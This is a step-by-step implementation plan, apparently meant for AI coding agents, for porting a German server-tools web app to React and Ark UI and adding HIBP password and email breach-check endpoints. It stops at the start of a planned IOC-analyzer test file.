# server-tools → React + Ark UI + Security Tools — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Rebuild the vanilla single-page `server-tools` app as a multi-page React + Ark UI application served by the existing passive Node backend, and add two security tools: *Have I Been Pwned* (`/pwned`) and *Is my server infected* (`/infected`).

**Architecture:** Vite + React (JSX) frontend with `react-router-dom` routes (`/`, `/tools`, `/pwned`, `/infected`) and `@ark-ui/react` headless components styled with the ported dark-lavender CSS. The 72 existing tools stay as a declarative data model rendered by one generic `<ToolCard>` component (the old `app.js` engine reborn). The existing `server.js` is kept passive and extended with three fixed-upstream proxy endpoints. The offline IOC analyzer and the k-anonymity password hashing run 100% in the browser.

**Tech Stack:** Node (built-in http, zero runtime deps in `server.js`), Vite, React 19, `@ark-ui/react`, `react-router-dom`, Vitest + Testing Library + jsdom.

---

## File Structure

```
server-tools/
  server.js                  # passive backend — extended with +3 endpoints
  package.json               # +deps, +dev/build/test scripts
  vite.config.js             # dev proxy /api -> :8099, build -> dist/
  vitest.config.js           # jsdom env, setup file
  vitest.setup.js            # @testing-library/jest-dom
  index.html                 # Vite entry (root)
  src/
    main.jsx                 # React root + <BrowserRouter>
    App.jsx                  # layout shell + Ark UI nav + <Routes>
    theme.css                # ported dark-lavender theme (CSS vars + base)
    pages/{Home,Tools,Pwned,Infected}.jsx
    components/ToolCard.jsx  # generic tool renderer (the engine)
    components/Result.jsx    # result box + copy button + live preview
    tools/index.js           # ported helpers + TOOLS array + CATS labels (one file)
    lib/api.js               # tiny backend client: api(path, body)
    lib/ioc.js               # offline IOC analyzer detectors (pure)
    lib/ioc.test.js
    lib/hibp.js              # client SHA-1 + k-anonymity match (pure-ish)
    lib/hibp.test.js
  server.test.js             # node:test for the new backend logic (pure parts)
  public/                    # LEGACY vanilla files — kept until Task 5 verifies parity, then deleted
```

**Decomposition notes:** `tools/index.js` is a near-verbatim port of `public/tools.js` (helpers + the `TOOLS` array kept together — lowest-risk port; ~280 lines fits in context). The `api()` network client is extracted into `lib/api.js` so pages can import it without pulling the tool data, and so the tool module imports it instead of redefining it. `ToolCard.jsx` replaces `public/app.js`. The two feature pages are bespoke. Backend logic that is pure (DNSBL reverse-name building, HIBP range parsing, reputation aggregation shape) is extracted into small testable functions inside `server.js` and exercised by `server.test.js`.

---

## Phase A — React shell + tool engine (Tasks 1–5)

### Task 1: Scaffold Vite + React + Ark UI + Router

**Files:**
- Create: `package.json` (rewrite scripts/deps), `vite.config.js`, `index.html`, `src/main.jsx`, `src/App.jsx`, `src/theme.css`
- Keep: `server.js`, `public/*` (untouched for now)

- [ ] **Step 1: Install toolchain and libraries**

Run:
```bash
cd /home/luxend/server-tools
npm install -D vite @vitejs/plugin-react
npm install react react-dom react-router-dom @ark-ui/react
```
Expected: `node_modules/` created, `package.json` gains `dependencies` + `devDependencies`. (This is the moment the project stops being zero-dep — intended.)

- [ ] **Step 2: Set scripts in `package.json`**

Edit `package.json` so `scripts` is exactly:
```json
"scripts": {
  "dev": "vite",
  "build": "vite build",
  "preview": "vite preview",
  "start": "node server.js",
  "test": "vitest run"
}
```
Keep `"name": "server-tools"`, bump `"version": "0.2.0"`, set `"type": "module"`, and change `"description"` to `"Passive server/DNS/dev tools hub — React + Ark UI"`.

> Note: `"type": "module"` makes `server.js` ESM. `server.js` currently uses `require(...)`. Task 4 Step 1 converts `server.js` to `import` syntax. Until then, run the server with the legacy file only after Task 4.

- [ ] **Step 3: Write `vite.config.js`**

```js
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';

export default defineConfig({
  plugins: [react()],
  server: {
    port: 5173,
    proxy: { '/api': 'http://localhost:8099' },
  },
  build: { outDir: 'dist' },
});
```

- [ ] **Step 4: Write root `index.html`**

```html
<!doctype html>
<html lang="de">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Server Tools</title>
</head>
<body>
  <div id="root"></div>
  <script type="module" src="/src/main.jsx"></script>
</body>
</html>
```

- [ ] **Step 5: Write `src/main.jsx`**

```jsx
import React from 'react';
import { createRoot } from 'react-dom/client';
import { BrowserRouter } from 'react-router-dom';
import App from './App.jsx';
import './theme.css';

createRoot(document.getElementById('root')).render(
  <React.StrictMode>
    <BrowserRouter>
      <App />
    </BrowserRouter>
  </React.StrictMode>,
);
```

- [ ] **Step 6: Write `src/App.jsx` (shell + nav + routes)**

```jsx
import { NavLink, Routes, Route } from 'react-router-dom';
import Home from './pages/Home.jsx';
import Tools from './pages/Tools.jsx';
import Pwned from './pages/Pwned.jsx';
import Infected from './pages/Infected.jsx';

const LINKS = [
  { to: '/', label: 'Home', end: true },
  { to: '/tools', label: 'Tools' },
  { to: '/pwned', label: 'Have I Been Pwned' },
  { to: '/infected', label: 'Server infiziert?' },
];

export default function App() {
  return (
    <div className="layout">
      <header>
        <div className="brand">🛠 <span>Server Tools</span></div>
      </header>
      <aside className="nav">
        {LINKS.map((l) => (
          <NavLink key={l.to} to={l.to} end={l.end}
            className={({ isActive }) => 'navlink' + (isActive ? ' active' : '')}>
            {l.label}
          </NavLink>
        ))}
      </aside>
      <main className="content">
        <Routes>
          <Route path="/" element={<Home />} />
          <Route path="/tools" element={<Tools />} />
          <Route path="/pwned" element={<Pwned />} />
          <Route path="/infected" element={<Infected />} />
        </Routes>
      </main>
      <footer>
        <span className="safe">🔒 Passiv &amp; abuse-sicher</span> — Offline-Tools laufen im Browser; das Backend spricht nur mit DNS-Resolvern, RDAP und festen, bekannten HIBP-Endpunkten. Kein Port-Scanner, keine SSRF.
      </footer>
    </div>
  );
}
```

- [ ] **Step 7: Write `src/theme.css`** by porting `public/style.css`

Open `public/style.css` and copy its `:root` CSS variables and color rules into `src/theme.css`. Then add the new layout grid (header / aside / main / footer) and nav styles. Minimum viable additions on top of the ported variables:
```css
* { box-sizing: border-box; }
body { margin: 0; font-family: system-ui, sans-serif; }
.layout { display: grid; grid-template-columns: 220px 1fr; grid-template-rows: auto 1fr auto;
  grid-template-areas: "header header" "nav content" "footer footer"; min-height: 100vh; }
header { grid-area: header; } .nav { grid-area: nav; } .content { grid-area: content; padding: 1.2rem; }
footer { grid-area: footer; }
.nav { display: flex; flex-direction: column; gap: 2px; padding: 1rem 0.5rem; }
.navlink { padding: 0.5rem 0.8rem; border-radius: 8px; text-decoration: none; color: inherit; }
.navlink.active { background: var(--accent, #b39ddb); color: #1a1626; font-weight: 600; }
```
Reuse the existing dark-lavender variable names from `style.css` (e.g. `--bg`, `--card`, `--accent`); if the names differ, keep the originals and reference them here.

- [ ] **Step 8: Create placeholder pages so the app compiles**

Create `src/pages/Home.jsx`, `Tools.jsx`, `Pwned.jsx`, `Infected.jsx` each as:
```jsx
export default function Home() { return <h1>Home</h1>; }
```
(adjust the function name + heading per file: `Tools`, `Pwned`, `Infected`).

- [ ] **Step 9: Verify dev server boots**

Run: `npm run dev` then open `http://localhost:5173`.
Expected: nav with 4 links renders; clicking links swaps the heading; no console errors. Stop the dev server (Ctrl-C).

- [ ] **Step 10: Commit**

```bash
git add -A
git commit -m "feat: scaffold Vite + React + Ark UI shell with routing"
```

---

### Task 2: Extract `api` client + port helpers/TOOLS into one module

**Files:**
- Create: `src/lib/api.js`, `src/tools/index.js`
- Source: `public/tools.js` (read, do not delete yet)

Keeping the helpers and the `TOOLS` array in **one module** avoids cross-module
export plumbing (every helper is in scope for the `run` functions, exactly as in
`public/tools.js` today). Only the `api()` client is pulled out so pages can
reuse it.

- [ ] **Step 1: Create `src/lib/api.js`** (lifted verbatim from the top of `public/tools.js`)

```js
// Backend client. Relative /api paths work behind the Vite dev proxy and in prod.
export async function api(path, body) {
  const r = await fetch(path, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify(body),
  });
  let j; try { j = await r.json(); } catch { throw new Error('Ungültige Serverantwort'); }
  if (!r.ok) throw new Error(j.error || ('HTTP ' + r.status));
  return j;
}
```

- [ ] **Step 2: Create `src/tools/index.js`** — port `public/tools.js` near-verbatim

Copy the **entire body** of `public/tools.js` into `src/tools/index.js`, then make
exactly these edits:
  1. **Delete** the local `async function api(...)` definition and add at the top:
     `import { api } from '../lib/api.js';`
  2. Replace the closing `window.TOOLS = [ ... ];` assignment's left-hand side with
     `export const TOOLS = [ ... ];` (array contents unchanged).
  3. **Category model (read `public/tools.js` line ~168 first):** the existing
     constants already hold the *display labels* —
     `const ED = 'Encode / Decode', CG = 'Crypto / Generatoren', DF = 'Daten / Format',
     TX = 'Text', CC = 'Farbe / CSS', MA = 'Mathe / Rechner', NW = 'Netzwerk-Tools',
     NB = 'Netzwerk (Backend)';` — and every tool's `cat:` field is one of these
     constants, so `tool.cat` is already the human-readable label. Keep that `const …`
     line **as-is**. Do NOT invent an abbreviation→label map. Instead export an
     ordered list of the categories (drives section order in the UI):
```js
export const CAT_ORDER = [ED, CG, DF, TX, CC, MA, NW, NB];
```
  > These 8 constants are the only `cat:` values used. If your copy of `public/tools.js`
  > shows different constant names/values, mirror exactly what's there.

- [ ] **Step 3: Sanity import check**

Run:
```bash
node --input-type=module -e "import('./src/tools/index.js').then(m=>console.log('tools', m.TOOLS.length, 'cats', m.CAT_ORDER.length)).catch(e=>{console.error(e);process.exit(1)})"
```
Expected: prints e.g. `tools 72 cats 8` with no error. If something is undefined, it
means a helper got dropped during the copy — re-add it. Fix until clean.

- [ ] **Step 4: Commit**

```bash
git add src/tools src/lib/api.js
git commit -m "feat: port tools to src/tools/index.js + extract api client"
```

---

### Task 3: Generic `<ToolCard>` + `<Result>` components

**Files:**
- Create: `src/components/Result.jsx`, `src/components/ToolCard.jsx`

- [ ] **Step 1: Write `src/components/Result.jsx`**

```jsx
import { useState } from 'react';

export default function Result({ value, error }) {
  const [copied, setCopied] = useState(false);
  if (error) return <pre className="result error">{String(error)}</pre>;
  if (value == null || value === '') return null;
  const copy = async () => {
    try { await navigator.clipboard.writeText(String(value)); setCopied(true);
      setTimeout(() => setCopied(false), 1200); } catch { /* clipboard blocked */ }
  };
  return (
    <div className="result-wrap">
      <button type="button" className="copy" onClick={copy}>{copied ? '✓ kopiert' : 'Kopieren'}</button>
      <pre className="result">{String(value)}</pre>
    </div>
  );
}
```

- [ ] **Step 2: Write `src/components/ToolCard.jsx`** — renders inputs from the data model and runs actions

```jsx
import { useState } from 'react';
import { Field } from '@ark-ui/react/field';
import { Checkbox } from '@ark-ui/react/checkbox';
import Result from './Result.jsx';

function initialValues(inputs) {
  const v = {};
  for (const i of inputs) v[i.id] = i.type === 'checkbox' ? !!i.checked : (i.value ?? '');
  return v;
}

function Input({ spec, value, onChange }) {
  const set = (val) => onChange(spec.id, val);
  if (spec.type === 'textarea')
    return (
      <Field.Root>
        <Field.Label>{spec.label}</Field.Label>
        <Field.Textarea rows={5} value={value} placeholder={spec.placeholder}
          onChange={(e) => set(e.target.value)} />
      </Field.Root>
    );
  if (spec.type === 'select')
    return (
      <Field.Root>
        <Field.Label>{spec.label}</Field.Label>
        <select value={value} onChange={(e) => set(e.target.value)} className="select">
          {spec.options.map((o) => <option key={o} value={o}>{o}</option>)}
        </select>
      </Field.Root>
    );
  if (spec.type === 'checkbox')
    return (
      <Checkbox.Root checked={value} onCheckedChange={(d) => set(!!d.checked)}>
        <Checkbox.Control />
        <Checkbox.Label>{spec.label}</Checkbox.Label>
      </Checkbox.Root>
    );
  return (
    <Field.Root>
      <Field.Label>{spec.label}</Field.Label>
      <Field.Input type={spec.type === 'number' ? 'number' : 'text'} value={value}
        placeholder={spec.placeholder} onChange={(e) => set(e.target.value)} />
    </Field.Root>
  );
}

export default function ToolCard({ tool }) {
  const [values, setValues] = useState(() => initialValues(tool.inputs));
  const [out, setOut] = useState({ value: null, error: null });
  const onChange = (id, val) => setValues((v) => ({ ...v, [id]: val }));
  const run = async (action) => {
    try { const r = await action.run(values); setOut({ value: r, error: null }); }
    catch (e) { setOut({ value: null, error: e.message || String(e) }); }
  };
  return (
    <section className="card" id={tool.id}>
      <h3>{tool.title}</h3>
      {tool.inputs.map((spec) => (
        <Input key={spec.id} spec={spec} value={values[spec.id]} onChange={onChange} />
      ))}
      <div className="actions">
        {tool.actions.map((a) => (
          <button key={a.label} type="button" onClick={() => run(a)}>{a.label}</button>
        ))}
      </div>
      <Result value={out.value} error={out.error} />
    </section>
  );
}
```
> Ark UI import paths use subpath form (`@ark-ui/react/field`, `@ark-ui/react/checkbox`). If the installed Ark UI version only exposes the barrel (`@ark-ui/react`), change imports to `import { Field, Checkbox } from '@ark-ui/react'`. Verify in Step 4.

- [ ] **Step 3: Build the `Tools` page in `src/pages/Tools.jsx`**

```jsx
import { useMemo, useState } from 'react';
import { TOOLS, CAT_ORDER } from '../tools/index.js';
import ToolCard from '../components/ToolCard.jsx';

export default function Tools() {
  const [q, setQ] = useState('');
  const filtered = useMemo(() => {
    const s = q.trim().toLowerCase();
    if (!s) return TOOLS;
    return TOOLS.filter((t) =>
      (t.title + ' ' + (t.kw || '') + ' ' + t.id).toLowerCase().includes(s));
  }, [q]);
  const byCat = useMemo(() => {
    const m = {};
    for (const t of filtered) (m[t.cat] ||= []).push(t);
    return m;
  }, [filtered]);
  return (
    <div>
      <div className="search-wrap">
        <input className="search" value={q} placeholder="Tool suchen…"
          onChange={(e) => setQ(e.target.value)} />
        <span className="count">{filtered.length} / {TOOLS.length}</span>
      </div>
      {CAT_ORDER.filter((cat) => byCat[cat]).map((cat) => (
        <section key={cat}>
          <h2>{cat}</h2>
          <div className="grid">
            {byCat[cat].map((t) => <ToolCard key={t.id} tool={t} />)}
          </div>
        </section>
      ))}
    </div>
  );
}
```

- [ ] **Step 4: Verify in the browser**

Run: `npm run dev`, open `/tools`. Expected: all categories render; each tool renders inputs + action buttons; running an offline tool (e.g. Base64 encode of "hi" → `aGk=`) shows a result with a working Kopieren button; search filters live. If Ark UI imports error, switch to the barrel import (see note in Step 2). Stop the dev server.

- [ ] **Step 5: Add styles for card/grid/search to `theme.css`**

```css
.grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 1rem; }
.card { background: var(--card, #241f33); border-radius: 12px; padding: 1rem; }
.card h3 { margin: 0 0 .6rem; } .actions { display: flex; flex-wrap: wrap; gap: .4rem; margin: .6rem 0; }
.result { background: #0000003a; padding: .6rem; border-radius: 8px; white-space: pre-wrap; word-break: break-word; }
.result.error { color: #ff8a8a; } .result-wrap { position: relative; }
.copy { position: absolute; right: .4rem; top: .4rem; }
.search { width: 100%; max-width: 480px; padding: .5rem .8rem; }
```

- [ ] **Step 6: Commit**

```bash
git add -A
git commit -m "feat: generic ToolCard engine + searchable Tools page"
```

---

### Task 4: Make `server.js` ESM + serve `dist/` with SPA fallback

**Files:**
- Modify: `server.js`

- [ ] **Step 1: Convert `server.js` requires to ESM imports**

At the top of `server.js`, replace the `require(...)` block with:
```js
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import net from 'node:net';
import { promises as dns } from 'node:dns';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
```
Leave the rest of the file logic unchanged for this step.

- [ ] **Step 2: Serve `dist/` and add SPA fallback**

Change `const PUBLIC = path.join(__dirname, 'public');` to:
```js
const PUBLIC = path.join(__dirname, 'dist');
```
In `serveStatic`, change the 404 branch so unknown non-file paths fall back to `index.html` (needed for client-side routes like `/tools`):
```js
function serveStatic(pathname, res) {
  let rel = decodeURIComponent(pathname);
  if (rel === '/' || rel === '') rel = '/index.html';
  let fp = path.join(PUBLIC, rel);
  if (!fp.startsWith(PUBLIC)) { res.writeHead(403).end('Forbidden'); return; }
  fs.readFile(fp, (err, data) => {
    if (err) {
      // SPA fallback: serve index.html for client-side routes (no file extension)
      if (!path.extname(fp)) {
        fs.readFile(path.join(PUBLIC, 'index.html'), (e2, html) => {
          if (e2) { res.writeHead(404, { 'content-type': 'text/plain' }).end('Not found'); return; }
          res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' }).end(html);
        });
        return;
      }
      res.writeHead(404, { 'content-type': 'text/plain' }).end('Not found'); return;
    }
    const type = TYPES[path.extname(fp).toLowerCase()] || 'application/octet-stream';
    res.writeHead(200, { 'content-type': type + (type.startsWith('text') ? '; charset=utf-8' : '') });
    res.end(data);
  });
}
```

- [ ] **Step 3: Guard `server.listen` so importing the module (in tests) doesn't bind the port**

Later tasks `import` pure functions from `server.js` in tests. Wrap the final
`server.listen(...)` line so it only runs when the file is executed directly:
```js
const isMain = process.argv[1] === fileURLToPath(import.meta.url);
if (isMain) server.listen(PORT, () => console.log('Server Tools → http://localhost:' + PORT));
```
(`fileURLToPath` is already imported in Step 1.) Without this guard,
`node --test server.test.js` would start a real HTTP server on import and hang.

- [ ] **Step 4: Build and run the real server**

Run:
```bash
npm run build && npm start
```
Open `http://localhost:8099`, navigate to `/tools`, then **reload** the page on `/tools`.
Expected: the build produces `dist/`; the server serves the app; deep-linking/reloading `/tools` works (SPA fallback). API still reachable (test a DNS tool). Stop the server.

- [ ] **Step 5: Commit**

```bash
git add -A
git commit -m "refactor: ESM server.js, serve dist/ with SPA fallback + main guard"
```

---

### Task 5: Verify `/tools` parity, retire legacy `public/` files

**Files:**
- Delete: `public/index.html`, `public/app.js`, `public/tools.js`, `public/style.css`

- [ ] **Step 1: Parity check against the old app**

With `npm start` running, manually exercise one tool from each category on `/tools` (e.g. Base64, Hash SHA-256, JSON format, Slug, Color converter, CIDR subnet, DNS lookup → real backend call). Confirm each produces correct output. Note any tool whose ported helper is missing/undefined and fix it in `src/tools/index.js`.

- [ ] **Step 2: Delete the legacy vanilla files**

```bash
git rm public/index.html public/app.js public/tools.js public/style.css
```
(If `public/` is now empty, that's fine — `dist/` is the served root.)

- [ ] **Step 3: Rebuild + smoke test**

Run: `npm run build && npm start`, open `/tools`, confirm unchanged. Stop the server.

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "chore: retire legacy vanilla frontend after React parity"
```

---

## Phase B — Have I Been Pwned (Tasks 6–9)

### Task 6: Backend `/api/hibp-password` (Pwned Passwords proxy)

**Files:**
- Modify: `server.js`
- Create/Modify: `server.test.js`

- [ ] **Step 1: Write the failing test for the pure parser**

Create `server.test.js`:
```js
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { parsePwnedRange } from './server.js';

test('parsePwnedRange counts a matching suffix', () => {
  // body lines are "SUFFIX:COUNT" (suffix = SHA1 hash minus first 5 chars)
  const body = '0018A45C4D1DEF81644B54AB7F969B88D65:1\n00D4F6E8FA6EECAD2A3AA415EEC418D38EC:2';
  assert.equal(parsePwnedRange(body, '00D4F6E8FA6EECAD2A3AA415EEC418D38EC'), 2);
});

test('parsePwnedRange returns 0 when suffix absent', () => {
  assert.equal(parsePwnedRange('ABC:5', 'DEADBEEF'), 0);
});
```

- [ ] **Step 2: Run it; expect failure**

Run: `node --test server.test.js`
Expected: FAIL — `parsePwnedRange` is not exported / not defined.

- [ ] **Step 3: Implement `parsePwnedRange` + endpoint in `server.js`**

Add near the other handlers:
```js
const HIBP_PW_HOST = 'https://api.pwnedpasswords.com';

export function parsePwnedRange(body, suffix) {
  suffix = String(suffix || '').toUpperCase();
  for (const line of body.split('\n')) {
    const [s, c] = line.trim().split(':');
    if (s && s.toUpperCase() === suffix) return parseInt(c, 10) || 0;
  }
  return 0;
}

async function apiHibpPassword({ prefix, suffix }) {
  if (!/^[0-9A-Fa-f]{5}$/.test(String(prefix || ''))) throw new Error('prefix muss 5 Hex-Zeichen sein');
  if (!/^[0-9A-Fa-f]{35}$/.test(String(suffix || ''))) throw new Error('suffix muss 35 Hex-Zeichen sein');
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), 8000);
  try {
    const r = await fetch(`${HIBP_PW_HOST}/range/${prefix.toUpperCase()}`,
      { signal: ctrl.signal, headers: { 'Add-Padding': 'true' } });
    if (!r.ok) throw new Error('HIBP HTTP ' + r.status);
    const text = await r.text();
    if (text.length > 1_000_000) throw new Error('Antwort zu groß');
    return { count: parsePwnedRange(text, suffix) };
  } catch (e) {
    if (e.name === 'AbortError') throw new Error('Timeout (HIBP nicht erreichbar)');
    throw e;
  } finally { clearTimeout(timer); }
}
```
Register in `ROUTES`: `'/api/hibp-password': apiHibpPassword,`.

> `export function parsePwnedRange` requires `server.js` to be ESM — done in Task 4. Adding `export` does not affect the running server.

- [ ] **Step 4: Run the test; expect pass**

Run: `node --test server.test.js`
Expected: PASS (both tests).

- [ ] **Step 5: Manual endpoint check**

Run `npm start`, then in another shell:
```bash
curl -s -XPOST localhost:8099/api/hibp-password -H 'content-type: application/json' \
  -d '{"prefix":"5BAA6","suffix":"1E4C9B93F3F0682250B6CF8331B7EE68FD8"}'
```
Expected: JSON like `{"count": <large number>}` (the SHA-1 of "password"). Stop the server.

- [ ] **Step 6: Commit**

```bash
git add server.js server.test.js
git commit -m "feat: passive /api/hibp-password proxy (Pwned Passwords k-anonymity)"
```

---

### Task 7: Client k-anonymity logic (`src/lib/hibp.js`)

**Files:**
- Create: `src/lib/hibp.js`, `src/lib/hibp.test.js`

- [ ] **Step 1: Write failing test**

`src/lib/hibp.test.js`:
```js
import { describe, it, expect } from 'vitest';
import { sha1Hex, splitHash } from './hibp.js';

describe('hibp client', () => {
  it('sha1Hex of "password" is the known SHA-1, uppercased', async () => {
    expect(await sha1Hex('password')).toBe('5BAA61E4C9B93F3F0682250B6CF8331B7EE68FD8');
  });
  it('splitHash returns 5-char prefix + 35-char suffix', () => {
    const { prefix, suffix } = splitHash('5BAA61E4C9B93F3F0682250B6CF8331B7EE68FD8');
    expect(prefix).toBe('5BAA6');
    expect(suffix).toBe('1E4C9B93F3F0682250B6CF8331B7EE68FD8');
  });
});
```

- [ ] **Step 2: Add Vitest config + setup, run test to confirm it fails**

Create `vitest.config.js` (scope `include` to `src/` so vitest does NOT try to run the node:test file `server.test.js`):
```js
import { defineConfig } from 'vitest/config';
export default defineConfig({
  test: {
    environment: 'jsdom',
    setupFiles: ['./vitest.setup.js'],
    globals: true,
    include: ['src/**/*.test.{js,jsx}'],
  },
});
```
Create `vitest.setup.js`:
```js
import '@testing-library/jest-dom';
```
Install test deps:
```bash
npm install -D vitest jsdom @testing-library/react @testing-library/jest-dom @testing-library/user-event
```
Run: `npx vitest run src/lib/hibp.test.js`
Expected: FAIL — `./hibp.js` has no such exports.

- [ ] **Step 3: Implement `src/lib/hibp.js`**

```js
// Browser-side k-anonymity helpers for HIBP Pwned Passwords.
export async function sha1Hex(text) {
  const buf = await crypto.subtle.digest('SHA-1', new TextEncoder().encode(text));
  return [...new Uint8Array(buf)].map((b) => b.toString(16).padStart(2, '0')).join('').toUpperCase();
}
export function splitHash(hex) {
  return { prefix: hex.slice(0, 5), suffix: hex.slice(5) };
}
export async function checkPassword(password, post) {
  const hash = await sha1Hex(password);
  const { prefix, suffix } = splitHash(hash);
  const { count } = await post('/api/hibp-password', { prefix, suffix });
  return count; // number of times seen in breaches
}
```
(`post` is injected so the function is testable; the page passes the real `api()` client.)

- [ ] **Step 4: Run; expect pass**

Run: `npx vitest run src/lib/hibp.test.js`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/lib/hibp.js src/lib/hibp.test.js vitest.config.js vitest.setup.js package.json
git commit -m "feat: client-side SHA-1 + k-anonymity helpers with tests"
```

---

### Task 8: Backend `/api/hibp-email` (key-gated)

**Files:**
- Modify: `server.js`, `server.test.js`

- [ ] **Step 1: Write failing test for the not-configured shape**

Append to `server.test.js`:
```js
import { hibpEmailConfigured } from './server.js';
test('hibpEmailConfigured reflects env presence', () => {
  assert.equal(hibpEmailConfigured(''), false);
  assert.equal(hibpEmailConfigured(undefined), false);
  assert.equal(hibpEmailConfigured('abc123'), true);
});
```

- [ ] **Step 2: Run; expect fail**

Run: `node --test server.test.js`
Expected: FAIL — `hibpEmailConfigured` not exported.

- [ ] **Step 3: Implement endpoint + helper in `server.js`**

```js
const HIBP_KEY = process.env.HIBP_KEY || '';
export const hibpEmailConfigured = (key = HIBP_KEY) => Boolean(key && String(key).trim());

const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
async function apiHibpEmail({ email }) {
  if (!hibpEmailConfigured()) return { configured: false, breaches: [] };
  if (!EMAIL_RE.test(String(email || ''))) throw new Error('Ungültige E-Mail');
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), 8000);
  try {
    const url = 'https://haveibeenpwned.com/api/v3/breachedaccount/' +
      encodeURIComponent(email) + '?truncateResponse=false';
    const r = await fetch(url, { signal: ctrl.signal,
      headers: { 'hibp-api-key': HIBP_KEY, 'user-agent': 'server-tools' } });
    if (r.status === 404) return { configured: true, breaches: [] }; // none found
    if (!r.ok) throw new Error('HIBP HTTP ' + r.status);
    const list = await r.json();
    const breaches = (Array.isArray(list) ? list : []).map((b) => ({
      name: b.Name, title: b.Title, date: b.BreachDate, count: b.PwnCount,
      data: b.DataClasses || [],
    }));
    return { configured: true, breaches };
  } catch (e) {
    if (e.name === 'AbortError') throw new Error('Timeout (HIBP nicht erreichbar)');
    throw e;
  } finally { clearTimeout(timer); }
}
```
Register: `'/api/hibp-email': apiHibpEmail,`.

- [ ] **Step 4: Run; expect pass**

Run: `node --test server.test.js`
Expected: PASS.

- [ ] **Step 5: Manual check (no key configured)**

Run `npm start` (without `HIBP_KEY`):
```bash
curl -s -XPOST localhost:8099/api/hibp-email -H 'content-type: application/json' -d '{"email":"a@b.com"}'
```
Expected: `{"configured":false,"breaches":[]}`. Stop the server.

- [ ] **Step 6: Commit**

```bash
git add server.js server.test.js
git commit -m "feat: key-gated /api/hibp-email proxy"
```

---

### Task 9: `/pwned` page (Ark UI Tabs)

**Files:**
- Modify: `src/pages/Pwned.jsx`
- Reference: `src/lib/api.js` (the `api` client), `src/lib/hibp.js`

- [ ] **Step 1: Implement `src/pages/Pwned.jsx`**

```jsx
import { useState } from 'react';
import { Tabs } from '@ark-ui/react/tabs';
import { api } from '../lib/api.js';
import { checkPassword } from '../lib/hibp.js';

function PasswordTab() {
  const [pw, setPw] = useState('');
  const [state, setState] = useState({ status: 'idle', count: 0, error: '' });
  const run = async () => {
    if (!pw) return;
    setState({ status: 'loading', count: 0, error: '' });
    try { const count = await checkPassword(pw, api);
      setState({ status: 'done', count, error: '' }); }
    catch (e) { setState({ status: 'error', count: 0, error: e.message }); }
  };
  return (
    <div>
      <p className="note">🔒 Das Passwort verlässt den Browser nicht. Es wird lokal mit SHA-1
        gehasht; nur die ersten 5 Hash-Zeichen werden gesendet (k-Anonymität).</p>
      <input type="password" value={pw} placeholder="Passwort"
        onChange={(e) => setPw(e.target.value)} />
      <button type="button" onClick={run}>Prüfen</button>
      {state.status === 'loading' && <p>Prüfe…</p>}
      {state.status === 'error' && <p className="result error">{state.error}</p>}
      {state.status === 'done' && (state.count > 0
        ? <p className="result error">⚠ In {state.count.toLocaleString('de-DE')} Datenlecks gefunden — nicht verwenden.</p>
        : <p className="result ok">✓ In keinem bekannten Datenleck gefunden.</p>)}
    </div>
  );
}

function EmailTab() {
  const [email, setEmail] = useState('');
  const [state, setState] = useState({ status: 'idle', data: null, error: '' });
  const run = async () => {
    setState({ status: 'loading', data: null, error: '' });
    try { const data = await api('/api/hibp-email', { email });
      setState({ status: 'done', data, error: '' }); }
    catch (e) { setState({ status: 'error', data: null, error: e.message }); }
  };
  return (
    <div>
      <input type="email" value={email} placeholder="name@example.com"
        onChange={(e) => setEmail(e.target.value)} />
      <button type="button" onClick={run}>Prüfen</button>
      {state.status === 'loading' && <p>Prüfe…</p>}
      {state.status === 'error' && <p className="result error">{state.error}</p>}
      {state.status === 'done' && state.data && (
        state.data.configured === false
          ? <p className="note">E-Mail-Prüfung ist nicht konfiguriert (kein HIBP_KEY gesetzt).</p>
          : state.data.breaches.length === 0
            ? <p className="result ok">✓ In keinem bekannten Datenleck gefunden.</p>
            : <ul className="breaches">{state.data.breaches.map((b) => (
                <li key={b.name}><strong>{b.title}</strong> ({b.date}) — {b.data.join(', ')}</li>
              ))}</ul>
      )}
    </div>
  );
}

export default function Pwned() {
  return (
    <div>
      <h1>Have I Been Pwned</h1>
      <Tabs.Root defaultValue="password">
        <Tabs.List>
          <Tabs.Trigger value="password">Passwort</Tabs.Trigger>
          <Tabs.Trigger value="email">E-Mail</Tabs.Trigger>
          <Tabs.Indicator />
        </Tabs.List>
        <Tabs.Content value="password"><PasswordTab /></Tabs.Content>
        <Tabs.Content value="email"><EmailTab /></Tabs.Content>
      </Tabs.Root>
    </div>
  );
}
```
> If `@ark-ui/react/tabs` errors, use `import { Tabs } from '@ark-ui/react'`.

- [ ] **Step 2: Verify in browser**

Run `npm run dev`, open `/pwned`. Password tab: type `password` → "found in N breaches". Email tab (no key): shows the not-configured note. Stop the dev server.

- [ ] **Step 3: Add minimal tab/note styles to `theme.css`**

```css
.note { background: #b39ddb22; border-left: 3px solid var(--accent, #b39ddb); padding: .6rem .8rem; border-radius: 6px; }
.result.ok { color: #8aff9e; } [data-part="trigger"][data-selected] { font-weight: 700; }
.breaches { line-height: 1.6; }
```

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "feat: /pwned page with password + email tabs (Ark UI)"
```

---

## Phase C — Is my server infected (Tasks 10–12)

### Task 10: Offline IOC analyzer (`src/lib/ioc.js`) — TDD

**Files:**
- Create: `src/lib/ioc.js`, `src/lib/ioc.test.js`

These detectors are pure `(text) => findings[]` functions. A finding is
`{ severity: 'high'|'medium'|'low', title, detail, line }`.

- [ ] **Step 1: Write failing tests**

`src/lib/ioc.test.js`:
```js
import { describe, it, expect } from 'vitest';
